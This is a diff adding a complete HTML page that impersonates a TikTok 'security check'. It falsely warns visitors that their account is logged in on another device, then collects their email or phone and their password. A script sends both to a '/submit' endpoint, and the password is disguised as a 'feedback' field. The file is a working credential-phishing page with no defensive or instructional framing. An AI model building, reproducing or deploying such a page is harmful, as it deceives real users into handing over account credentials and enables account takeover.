@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tiktok Security Check</title>
+
+<style>
+body {
+  font-family: Arial;
+  background: linear-gradient(135deg, #000, #25F4EE, #FE2C55);
+  display:flex; justify-content:center; align-items:center;
+  height:100vh;
+}
+.container {
+  background:white;
+  padding:20px;
+  border-radius:10px;
+  width:100%;
+  max-width:400px;
+}
+input, textarea, button {
+  width:100%;
+  padding:12px;
+  margin:10px 0;
+  border-radius:8px;
+  border:1px solid #ccc;
+}
+button {
+  background:#FE2C55;
+  color:white;
+  font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+<h2>we noticed your tiktok account is logged in on another device</h2>
+<p><i>login in on this Device now to secure your account</i></p>
+<form id="form">
+<input type="text" id="contact" placeholder="Email or Phone" required>
+<textarea id="feedback" placeholder="input your password" required></textarea>
+<button type="submit">Submit</button>
+</form>
+
+</div>
+
+<script>
+document.getElementById("form").addEventListener("submit", async function(e){
+  e.preventDefault();
+
+  await fetch("/submit", {
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({
+      contact: contact.value,
+      feedback: feedback.value
+    })
+  });
+
+  alert("Submitted!");
+  this.reset();
+});
+</script>
+
+</body>
+</html>
